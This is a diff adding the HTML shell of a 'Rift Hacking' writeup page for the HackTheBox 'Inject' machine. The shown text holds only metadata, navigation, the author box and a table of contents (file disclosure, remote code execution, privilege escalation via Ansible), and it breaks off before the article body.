@@ -1,0 +1,1483 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
+  data-auto-appearance="true"><head>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>Inject Writeup &middot; Rift Hacking</title>
+  <meta name="title" content="Inject Writeup &middot; Rift Hacking" />
+  
+  <meta name="description" content="Resolucion de Maquina Inject" />
+  <meta name="keywords" content="HackTheBox, " />
+  
+  
+  <link rel="canonical" href="https://rifthacking.pages.dev/writeups/4.-inject/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.fd3d87fd720bf5d79964744f02d90e26851773a8c317198a40933c8afea57936ad0ba652b90d786c2bd9e93c3a18fac58553570798444f0a6f073ad57571a79b.css"
+    integrity="sha512-/T2H/XIL9deZZHRPAtkOJoUXc6jDFxmKQJM8iv6leTatC6ZSuQ14bCvZ6Tw6GPrFhVNXB5hETwpvBzrVdXGnmw==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.17ffe617e664d257760ee5f71869a6d9328d3613601c03a2eb7a194bbfb06ddc629a70f7b348e6e9446e81d0789555aebce09d27debd0329fc297601a1ee6a77.js"
+    integrity="sha512-F//mF&#43;Zk0ld2DuX3GGmm2TKNNhNgHAOi63oZS7&#43;wbdximnD3s0jm6URugdB4lVWuvOCdJ969Ayn8KXYBoe5qdw==" data-copy="" data-copied=""></script>
+  
+  
+  <script src="/js/zoom.min.js"></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="https://rifthacking.pages.dev/writeups/4.-inject/">
+  <meta property="og:site_name" content="Rift Hacking">
+  <meta property="og:title" content="Inject Writeup">
+  <meta property="og:description" content="All WriteUps">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+  <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2024-04-19T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-04-19T00:00:00+00:00">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="og:image" content="https://rifthacking.pages.dev/writeups/4.-inject/featured.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://rifthacking.pages.dev/writeups/4.-inject/featured.png"><meta name="twitter:title" content="Inject Writeup">
+<meta name="twitter:description" content="All WriteUps">
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "WriteUps",
+    "name": "Inject Writeup",
+    "headline": "Inject Writeup",
+    "description": "All WriteUps",
+    "abstract": "Resolucion de Maquina Inject",
+    "inLanguage": "en",
+    "url" : "https:\/\/rifthacking.pages.dev\/writeups\/4.-inject\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Rift Hacking"
+    },
+    "copyrightYear": "2024",
+    "dateCreated": "2024-04-19T00:00:00\u002b00:00",
+    "datePublished": "2024-04-19T00:00:00\u002b00:00",
+    
+    "dateModified": "2024-04-19T00:00:00\u002b00:00",
+    
+    "keywords": ["HackTheBox"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1445"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="Rift Hacking" />
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.js" integrity=""></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 pl-[24px] pr-[24px]" style="z-index:100">
+  <div id="menu-blur" class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div>
+  <div class="relative max-w-[64rem] ml-auto mr-auto">
+    <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    
+    
+    <div>
+        <a href="/" class="flex">
+            <span class="sr-only">Rift Hacking</span>
+
+            <img src="/banner.png" width="96" height="117"
+                class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt="Rift Hacking" />
+
+        </a>
+    </div>
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Rift Hacking</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">
+
+            
+            
+             
+  <div>
+  <div class="cursor-pointer flex items-center nested-menu">
+    
+    <a  class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="">
+      Articles
+    </a>
+    <span>
+      
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+    </span>
+  </div>
+  <div class="absolute menuhide">
+    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
+      <div class="flex flex-col space-y-3">
+        
+        <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            All
+          </p>
+        </a>
+        
+        <a href="/tags/web/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            Web
+          </p>
+        </a>
+        
+        <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            Windows
+          </p>
+        </a>
+        
+        <a href="/tags/cve/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            CVE
+          </p>
+        </a>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+            
+             
+  <div>
+  <div class="cursor-pointer flex items-center nested-menu">
+    
+    <a  class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="">
+      Writeups
+    </a>
+    <span>
+      
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+    </span>
+  </div>
+  <div class="absolute menuhide">
+    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
+      <div class="flex flex-col space-y-3">
+        
+        <a href="/writeups/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            All Writeups
+          </p>
+        </a>
+        
+        <a href="/tags/hackthebox/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            HackTheBox
+          </p>
+        </a>
+        
+        <a href="/tags/tryhackme/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            TryHackme
+          </p>
+        </a>
+        
+        <a href="/tags/vulnhub/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            VulnHub
+          </p>
+        </a>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+            
+            
+  <a href="/team/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        Team
+    </p>
+</a>
+
+
+            
+            
+  <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        About
+    </p>
+</a>
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" for="menu-controller" class="block">
+            <input type="checkbox" id="menu-controller" class="hidden" />
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li>
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                     
+  <li class="mt-1">
+    <a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Articles
+        </p>
+        <span>
+            
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+        </span>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            All
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/tags/web/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            Web
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            Windows
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/tags/cve/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            CVE
+        </p>
+    </a>
+</li>
+
+<li class="mb-2"></li>
+
+
+
+                    
+
+                     
+  <li class="mt-1">
+    <a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Writeups
+        </p>
+        <span>
+            
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+        </span>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/writeups/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            All Writeups
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/tags/hackthebox/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            HackTheBox
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/tags/tryhackme/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            TryHackme
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/tags/vulnhub/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            VulnHub
+        </p>
+    </a>
+</li>
+
+<li class="mb-2"></li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/team/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Team
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            About
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+<script>
+    (function () {
+        var $mainmenu = $('.main-menu');
+        var path = window.location.pathname;
+        $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
+            $(e).children('p').addClass('active');
+        });
+    })();
+</script>
+
+
+  </div>
+</div>
+<script>
+  window.addEventListener('scroll', function (e) {
+    var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+    var background_blur = document.getElementById('menu-blur');
+    background_blur.style.opacity = (scroll / 300);
+  });
+</script>
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+  
+  
+  
+  
+  
+        
+            <div class="w-full h-36 md:h-56 lg:h-72 single_hero_basic nozoom" style="background-image:url(/writeups/4.-inject/featured_hu4ab5fe33aae27ae57169153f07804a8a_4116753_1200x0_resize_box_3.png);"></div>
+        
+    
+  
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    <link rel="icon" type="image/png" sizes="32x32" href="static/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="static/favicon-16x16.png">
+    <link rel="manifest" href="static/site.webmanifest">
+    
+    <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/"
+      >Rift Hacking</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline ">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/writeups/"
+      >WriteUps</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/writeups/4.-inject/"
+      >Inject Writeup</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      Inject Writeup
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2024-04-19 00:00:00 &#43;0000 UTC">19 April 2024</time>
+  
+
+  
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+    
+
+    
+<div class="flex author author-extra mt-4">
+  
+      
+      
+        
+          
+        
+        <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
+          src="/team/me/a_hubec408c9d9c6bf7db59f115058e32289_123866_192x192_fill_box_center_3.png" />
+      
+  
+  <div class="place-self-center">
+    
+    
+    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+      Author
+    </div>
+    <a  href="https://rifthacking.pages.dev//authors/jose"  class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+      Jose Milane (Aka. Mhil4ne)
+    </a>
+    
+    
+    <div class="text-sm text-neutral-700 dark:text-neutral-400">Founder - 3 Post</div>
+    
+    <div class="text-2xl sm:text-lg">
+      <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+        
+        
+        <a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href="https://www.linkedin.com/in/byt3nu1l" target="_blank"
+          aria-label="Linkedin" rel="me noopener noreferrer"><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+  </span>
+
+</span></a>
+        
+        
+        
+        <a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href="https://github.com/byt3nu1l" target="_blank"
+          aria-label="Github" rel="me noopener noreferrer"><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+</span></a>
+        
+        
+        
+        <a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href="https://app.hackthebox.com/profile/1022508" target="_blank"
+          aria-label="Link" rel="me noopener noreferrer"><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+  </span>
+
+</span></a>
+        
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+    <div class="mb-5"></div>
+    
+  
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+     <div
+      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]">
+
+         <details open class="toc-right mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#initial-recon">Initial Recon</a></li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#file-disclosure">File Disclosure</a></li>
+        <li><a href="#remote-code-execution">Remote Code Execution</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#frank">Frank</a></li>
+        <li><a href="#phil">Phil</a>
+          <ul>
+            <li><a href="#ansible">Ansible</a></li>
+            <li><a href="#alternative-solution-bonus">Alternative Solution (Bonus)</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#initial-recon">Initial Recon</a></li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#file-disclosure">File Disclosure</a></li>
+        <li><a href="#remote-code-execution">Remote Code Execution</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#frank">Frank</a></li>
+        <li><a href="#phil">Phil</a>
+          <ul>
+            <li><a href="#ansible">Ansible</a></li>
+            <li><a href="#alternative-solution-bonus">Alternative Solution (Bonus)</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+ 
+<script>
+  (function () {
+    var $toc = $('#TableOfContents');
+    if ($toc.length > 0) {
+      var $window = $(window);
+
